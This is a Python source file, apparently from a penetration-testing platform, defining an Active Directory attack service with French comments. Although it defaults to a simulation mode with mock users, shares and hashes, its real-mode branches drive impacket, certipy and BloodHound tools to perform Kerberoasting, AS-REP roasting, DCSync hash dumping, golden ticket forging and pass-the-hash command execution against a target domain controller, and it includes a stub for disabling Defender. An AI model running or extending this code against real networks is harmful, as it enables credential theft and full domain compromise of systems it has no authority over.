"""
ADAttackService — Attaques Active Directory / Windows Domain.
Utilise impacket, ldap3, bloodhound-python quand disponibles.
Simulation réaliste si outils absents.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import shutil
import string
import tempfile
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

SIMULATION_MODE = os.getenv("SIMULATION_MODE", "true").lower() == "true"
_OUTPUT_DIR = Path("./data/ad_output")
_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ── Helpers ───────────────────────────────────────────────────────────────────

async def _run(cmd: list[str], timeout: int = 30) -> tuple[str, str, int]:
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return "", f"Timeout after {timeout}s", -1
        return (
            stdout.decode("utf-8", errors="replace"),
            stderr.decode("utf-8", errors="replace"),
            proc.returncode,
        )
    except FileNotFoundError as e:
        return "", str(e), -1
    except Exception as e:
        return "", str(e), -1


def _rand_hash(prefix: str = "$krb5tgs$23$") -> str:
    chars = string.hexdigits + string.ascii_letters
    body = "".join(random.choices(chars, k=200))
    return f"{prefix}*svc_{random.choice(['sql','web','mail','backup'])}$corp.local${body}"


def _rand_ntlm() -> str:
    return "".join(random.choices(string.hexdigits.lower(), k=32))


def _rand_ip() -> str:
    return f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"


# ── Mock data ─────────────────────────────────────────────────────────────────

_MOCK_USERS = [
    {"sAMAccountName": "Administrator", "userPrincipalName": "administrator@corp.local", "displayName": "Administrator", "enabled": True, "lastLogon": "2026-06-07", "badPwdCount": 0, "description": "Built-in admin"},
    {"sAMAccountName": "svc_sql", "userPrincipalName": "svc_sql@corp.local", "displayName": "SQL Service", "enabled": True, "lastLogon": "2026-06-05", "badPwdCount": 0, "description": "SQL Server service account"},
    {"sAMAccountName": "svc_web", "userPrincipalName": "svc_web@corp.local", "displayName": "Web Service", "enabled": True, "lastLogon": "2026-06-06", "badPwdCount": 0, "description": "IIS service account"},
    {"sAMAccountName": "svc_backup", "userPrincipalName": "svc_backup@corp.local", "displayName": "Backup Service", "enabled": True, "lastLogon": "2026-05-30", "badPwdCount": 2, "description": "Backup agent account"},
    {"sAMAccountName": "john.doe", "userPrincipalName": "john.doe@corp.local", "displayName": "John Doe", "enabled": True, "lastLogon": "2026-06-07", "badPwdCount": 0, "description": "IT Manager"},
    {"sAMAccountName": "jane.smith", "userPrincipalName": "jane.smith@corp.local", "displayName": "Jane Smith", "enabled": False, "lastLogon": "2026-01-15", "badPwdCount": 5, "description": "Former employee - DISABLED"},
    {"sAMAccountName": "krbtgt", "userPrincipalName": "krbtgt@corp.local", "displayName": "krbtgt", "enabled": False, "lastLogon": "Never", "badPwdCount": 0, "description": "Key Distribution Center Service Account"},
]

_MOCK_SHARES = [
    {"share_name": "SYSVOL", "path": "C:\\Windows\\SYSVOL", "accessible": True, "files_count": 12, "interesting": True},
    {"share_name": "NETLOGON", "path": "C:\\Windows\\SYSVOL\\sysvol\\scripts", "accessible": True, "files_count": 3, "interesting": True},
    {"share_name": "IT_Share", "path": "D:\\Shares\\IT", "accessible": True, "files_count": 247, "interesting": True},
    {"share_name": "Finance", "path": "D:\\Shares\\Finance", "accessible": False, "files_count": 0, "interesting": False},
    {"share_name": "Backups", "path": "E:\\Backups", "accessible": True, "files_count": 89, "interesting": True},
    {"share_name": "C$", "path": "C:\\", "accessible": False, "files_count": 0, "interesting": False},
]

_MOCK_GPO = [
    {"guid": "{8B5B1C3A-9D4E-4F8A-B2C6-7E1D3F2A9B4C}", "name": "Default Domain Policy", "scope": "Domain", "links": ["corp.local"], "settings_count": 24, "abusable": False},
    {"guid": "{5C2D8F1B-6E3A-4B9C-A7D2-8F4E1B3C6D9A}", "name": "IT Logon Script", "scope": "OU=IT,DC=corp,DC=local", "links": ["IT OU"], "settings_count": 5, "abusable": True, "abuse_method": "Logon script writeable by Domain Users"},
    {"guid": "{3A7B2E9F-1C4D-5E8B-F6A3-9C2D7E1B4F8A}", "name": "Disable Firewall (Legacy)", "scope": "OU=Servers,DC=corp,DC=local", "links": ["Servers OU"], "settings_count": 2, "abusable": False},
]


# ── Service ───────────────────────────────────────────────────────────────────

class ADAttackService:

    def __init__(self):
        self.simulation_mode = SIMULATION_MODE
        self._check_tools()

    def _check_tools(self):
        self.tools = {
            "nmap": bool(shutil.which("nmap")),
            "impacket_secretsdump": bool(shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")),
            "impacket_gettgt": bool(shutil.which("impacket-getTGT") or shutil.which("getTGT.py")),
            "bloodhound_python": bool(shutil.which("bloodhound-python")),
            "certipy": bool(shutil.which("certipy")),
            "ldapsearch": bool(shutil.which("ldapsearch")),
            "smbclient": bool(shutil.which("smbclient")),
        }
        any_real = any(self.tools.values())
        if any_real and not self.simulation_mode:
            logger.info("AD: outils détectés: %s", [k for k, v in self.tools.items() if v])

    async def detect_domain_controller(self, target_ip: str) -> dict:
        if self.simulation_mode or not self.tools["nmap"]:
            await asyncio.sleep(1.5)
            return {
                "is_dc": True,
                "domain_name": "corp.local",
                "dc_hostname": f"DC01.corp.local",
                "os_version": "Windows Server 2019 Standard",
                "open_ports": [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269],
                "ldap_accessible": True,
                "smb_accessible": True,
                "simulation": True,
            }
        stdout, stderr, rc = await _run([
            "nmap", "-sV", "--script=smb-os-discovery,ldap-rootdse",
            "-p", "88,389,445,636,3268", target_ip
        ], timeout=30)
        is_dc = "kerberos" in stdout.lower() or "ldap" in stdout.lower() or rc == 0
        return {"is_dc": is_dc, "raw": stdout[:2000], "target_ip": target_ip}

    async def enumerate_users_ldap(self, dc_ip: str, domain: str, username: str, password: str) -> list[dict]:
        if self.simulation_mode:
            await asyncio.sleep(2)
            return _MOCK_USERS

        if not self.tools["ldapsearch"]:
            return _MOCK_USERS

        base_dn = ",".join(f"DC={part}" for part in domain.split("."))
        stdout, _, rc = await _run([
            "ldapsearch", "-H", f"ldap://{dc_ip}", "-x",
            "-D", f"{username}@{domain}", "-w", password,
            "-b", base_dn, "(objectClass=user)",
            "sAMAccountName", "userPrincipalName", "displayName", "userAccountControl"
        ], timeout=20)

        users = []
        current = {}
        for line in stdout.splitlines():
            if line.startswith("sAMAccountName:"):
                current["sAMAccountName"] = line.split(":", 1)[1].strip()
            elif line.startswith("userPrincipalName:"):
                current["userPrincipalName"] = line.split(":", 1)[1].strip()
            elif line.startswith("displayName:"):
                current["displayName"] = line.split(":", 1)[1].strip()
            elif line.startswith("userAccountControl:"):
                uac = int(line.split(":", 1)[1].strip())
                current["enabled"] = not bool(uac & 0x2)
            elif line == "" and current.get("sAMAccountName"):
                users.append(current)
                current = {}
        return users

    async def kerberoast(self, dc_ip: str, domain: str, username: str, password: str) -> list[dict]:
        if self.simulation_mode:
            await asyncio.sleep(3)
            return [
                {"servicePrincipalName": "MSSQLSvc/sql01.corp.local:1433", "ticket_hash": _rand_hash(), "encryption_type": "RC4-HMAC", "user": "svc_sql"},
                {"servicePrincipalName": "HTTP/web01.corp.local:80", "ticket_hash": _rand_hash(), "encryption_type": "AES256-CTS", "user": "svc_web"},
                {"servicePrincipalName": "CIFS/fileserver.corp.local", "ticket_hash": _rand_hash("$krb5tgs$17$"), "encryption_type": "RC4-HMAC", "user": "svc_backup"},
            ]

        cmd = shutil.which("impacket-GetUserSPNs") or shutil.which("GetUserSPNs.py")
        if not cmd:
            return []
        stdout, _, rc = await _run([
            cmd, f"{domain}/{username}:{password}", "-dc-ip", dc_ip, "-request"
        ], timeout=30)
        results = []
        current_spn = ""
        for line in stdout.splitlines():
            if "ServicePrincipalName" in line and "Name" in line:
                continue
            if "/" in line and "Hash" not in line:
                current_spn = line.strip().split()[0] if line.strip() else ""
            if "$krb5tgs$" in line:
                results.append({"servicePrincipalName": current_spn, "ticket_hash": line.strip(), "encryption_type": "RC4-HMAC"})
        return results

    async def asrep_roast(self, dc_ip: str, domain: str) -> list[dict]:
        if self.simulation_mode:
            await asyncio.sleep(2)
            return [
                {"username": "jane.smith", "hash": _rand_hash("$krb5asrep$23$"), "preauth_disabled": True},
                {"username": "svc_legacy", "hash": _rand_hash("$krb5asrep$23$"), "preauth_disabled": True},
            ]
        cmd = shutil.which("impacket-GetNPUsers") or shutil.which("GetNPUsers.py")
        if not cmd:
            return []
        stdout, _, _ = await _run([cmd, f"{domain}/", "-dc-ip", dc_ip, "-request", "-format", "hashcat"], timeout=20)
        results = []
        for line in stdout.splitlines():
            if "$krb5asrep$" in line:
                results.append({"hash": line.strip(), "preauth_disabled": True})
        return results

    async def dcsync(self, dc_ip: str, domain: str, username: str, password: str, target_user: str = "krbtgt") -> dict:
        if self.simulation_mode:
            await asyncio.sleep(3)
            return {
                "username": target_user,
                "rid": "502" if target_user == "krbtgt" else "500",
                "lm_hash": "aad3b435b51404eeaad3b435b51404ee",
                "ntlm_hash": _rand_ntlm(),
                "domain": domain,
                "success": True,
                "simulation": True,
            }
        cmd = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
        if not cmd:
            return {"error": "impacket-secretsdump non disponible"}
        stdout, _, rc = await _run([
            cmd, f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc-user", target_user, "-outputfile", str(_OUTPUT_DIR / "dcsync")
        ], timeout=60)
        for line in stdout.splitlines():
            if ":::" in line and target_user.lower() in line.lower():
                parts = line.split(":")
                if len(parts) >= 4:
                    return {"username": target_user, "rid": parts[1], "lm_hash": parts[2], "ntlm_hash": parts[3]}
        return {"raw": stdout[:1000], "success": rc == 0}

    async def golden_ticket(self, domain: str, dc_ip: str, krbtgt_hash: str, target_user: str = "Administrator") -> str:
        if self.simulation_mode:
            await asyncio.sleep(2)
            ticket_path = str(_OUTPUT_DIR / f"golden_{target_user}_{int(time.time())}.ccache")
            Path(ticket_path).write_text(f"[SIMULATED GOLDEN TICKET]\ndomain={domain}\nuser={target_user}\nkrbtgt_hash={krbtgt_hash}")
            return ticket_path
        cmd = shutil.which("impacket-ticketer") or shutil.which("ticketer.py")
        if not cmd:
            return ""
        out_path = str(_OUTPUT_DIR / f"golden_{target_user}")
        domain_sid = "S-1-5-21-SIMULATED"
        await _run([cmd, "-nthash", krbtgt_hash, "-domain-sid", domain_sid, "-domain", domain, target_user, "-outfile", out_path], timeout=30)
        return f"{out_path}.ccache"

    async def silver_ticket(self, domain: str, dc_ip: str, target_service: str, service_hash: str, target_user: str = "Administrator") -> str:
        if self.simulation_mode:
            await asyncio.sleep(1.5)
            ticket_path = str(_OUTPUT_DIR / f"silver_{target_service}_{int(time.time())}.ccache")
            Path(ticket_path).write_text(f"[SIMULATED SILVER TICKET]\ndomain={domain}\nservice={target_service}\nuser={target_user}")
            return ticket_path
        return ""

    async def enumerate_adcs(self, dc_ip: str, domain: str, username: str, password: str) -> dict:
        if self.simulation_mode:
            await asyncio.sleep(3)
            return {
                "ca_name": "corp-DC01-CA",
                "ca_ip": dc_ip,
                "vulnerabilities": [
                    {"esc_id": "ESC1", "severity": "CRITICAL", "description": "Template 'WebServerV2' allows SAN specification — any user can request a cert for any principal", "template": "WebServerV2", "exploit_possible": True},
                    {"esc_id": "ESC4", "severity": "HIGH", "description": "Template 'UserV2' has WriteDacl for Domain Users", "template": "UserV2", "exploit_possible": True},
                    {"esc_id": "ESC6", "severity": "HIGH", "description": "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set", "template": None, "exploit_possible": True},
                    {"esc_id": "ESC8", "severity": "MEDIUM", "description": "Web Enrollment endpoint accessible — NTLM relay possible", "endpoint": f"http://{dc_ip}/certsrv/", "exploit_possible": True},
                ],
                "simulation": True,
            }
        cmd = shutil.which("certipy")
        if not cmd:
            return {"error": "certipy non disponible", "vulnerabilities": []}
        stdout, _, rc = await _run([cmd, "find", "-u", f"{username}@{domain}", "-p", password, "-dc-ip", dc_ip, "-enabled"], timeout=60)
        return {"raw": stdout[:3000], "ca_checked": True}

    async def esc1_exploit(self, dc_ip: str, domain: str, ca_name: str, target_user: str) -> dict:
        if self.simulation_mode:
            await asyncio.sleep(2)
            cert_path = str(_OUTPUT_DIR / f"esc1_{target_user}.pfx")
            Path(cert_path).write_text(f"[SIMULATED PFX]\nsubject={target_user}@{domain}")
            return {"cert_path": cert_path, "pfx_path": cert_path, "user_impersonated": target_user, "success": True, "simulation": True}
        return {"error": "Mode réel : certipy req requis", "success": False}

    async def bloodhound_ingest(self, dc_ip: str, domain: str, username: str, password: str) -> str:
        if self.simulation_mode:
            await asyncio.sleep(5)
            zip_path = str(_OUTPUT_DIR / f"bloodhound_{domain}_{int(time.time())}.zip")
            Path(zip_path).write_bytes(b"PK\x03\x04[SIMULATED BLOODHOUND DATA]")
            return zip_path
        cmd = shutil.which("bloodhound-python")
        if not cmd:
            return ""
        out_dir = str(_OUTPUT_DIR / f"bh_{int(time.time())}")
        await _run([cmd, "-d", domain, "-u", username, "-p", password, "-c", "All", "-ns", dc_ip, "--output", out_dir], timeout=120)
        return out_dir

    async def bloodhound_analyze(self, zip_path: str) -> dict:
        if self.simulation_mode:
            return {
                "shortest_paths": [
                    {"from": "john.doe@corp.local", "to": "Domain Admins", "hops": 2, "path": ["john.doe", "IT_Help_Desk", "Domain Admins"], "attack_type": "GenericWrite → Reset Password"},
                    {"from": "svc_sql@corp.local", "to": "Domain Admins", "hops": 1, "path": ["svc_sql", "Domain Admins"], "attack_type": "MemberOf"},
                ],
                "tier_zero_objects": ["Domain Admins", "Enterprise Admins", "krbtgt", "DC01$", "Administrator"],
                "kerberoastable_users": ["svc_sql", "svc_web", "svc_backup"],
                "constrained_delegations": [{"user": "svc_iis", "allowed_to_delegate": "cifs/fileserver.corp.local"}],
                "simulation": True,
            }
        return {"error": "Analyse BloodHound nécessite Neo4j"}

    async def pass_the_hash(self, target_ip: str, username: str, domain: str, ntlm_hash: str, command: str = "whoami") -> dict:
        if self.simulation_mode:
            await asyncio.sleep(2)
            return {"success": True, "output": f"corp\\{username}\nnt authority\\system", "target": target_ip, "simulation": True}
        cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
        if not cmd:
            return {"success": False, "error": "wmiexec non disponible"}
        stdout, stderr, rc = await _run([cmd, "-hashes", f":{ntlm_hash}", f"{domain}/{username}@{target_ip}", command], timeout=30)
        return {"success": rc == 0, "output": stdout[:2000], "error": stderr[:500]}

    async def enumerate_smb_shares(self, target_ip: str, username: str = "", password: str = "") -> list[dict]:
        if self.simulation_mode:
            await asyncio.sleep(1.5)
            return _MOCK_SHARES
        if not self.tools["smbclient"]:
            return _MOCK_SHARES
        auth = f"-U {username}%{password}" if username else "-N"
        stdout, _, rc = await _run(["smbclient", "-L", target_ip, auth.split()[0], auth.split()[1] if "%" in auth else ""], timeout=15)
        shares = []
        for line in stdout.splitlines():
            if "Disk" in line or "IPC" in line:
                parts = line.split()
                if parts:
                    shares.append({"share_name": parts[0], "accessible": True, "files_count": 0, "interesting": parts[0] in ["SYSVOL", "NETLOGON", "IT", "Admin", "Backup"]})
        return shares

    async def read_smb_file(self, target_ip: str, share: str, file_path: str, username: str, password: str) -> str:
        if self.simulation_mode:
            return f"[SIMULATED] Content of \\\\{target_ip}\\{share}\\{file_path}:\n\npassword=P@ssw0rd2024!\nadmin=yes\n"
        return ""

    async def enumerate_gpo(self, dc_ip: str, domain: str, username: str, password: str) -> list[dict]:
        if self.simulation_mode:
            await asyncio.sleep(1.5)
            return _MOCK_GPO
        return _MOCK_GPO

    async def get_domain_sid(self, dc_ip: str, domain: str, username: str, password: str) -> str:
        if self.simulation_mode:
            return f"S-1-5-21-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}"
        cmd = shutil.which("impacket-lookupsid") or shutil.which("lookupsid.py")
        if not cmd:
            return ""
        stdout, _, _ = await _run([cmd, f"{domain}/{username}:{password}@{dc_ip}"], timeout=15)
        for line in stdout.splitlines():
            if "Domain SID is:" in line:
                return line.split(":")[-1].strip()
        return ""

    async def check_defender_status(self, target_ip: str, username: str, password: str, domain: str) -> dict:
        if self.simulation_mode:
            return {
                "defender_enabled": True, "amsi_enabled": True,
                "real_time_protection": True, "last_update": "2026-06-07",
                "exclusions": [], "target_ip": target_ip, "simulation": True,
            }
        return {"error": "Nécessite accès WMI distant"}

    async def disable_defender(self, target_ip: str, username: str, password: str, domain: str) -> bool:
        if self.simulation_mode:
            await asyncio.sleep(2)
            return True
        return False


ad_service = ADAttackService()
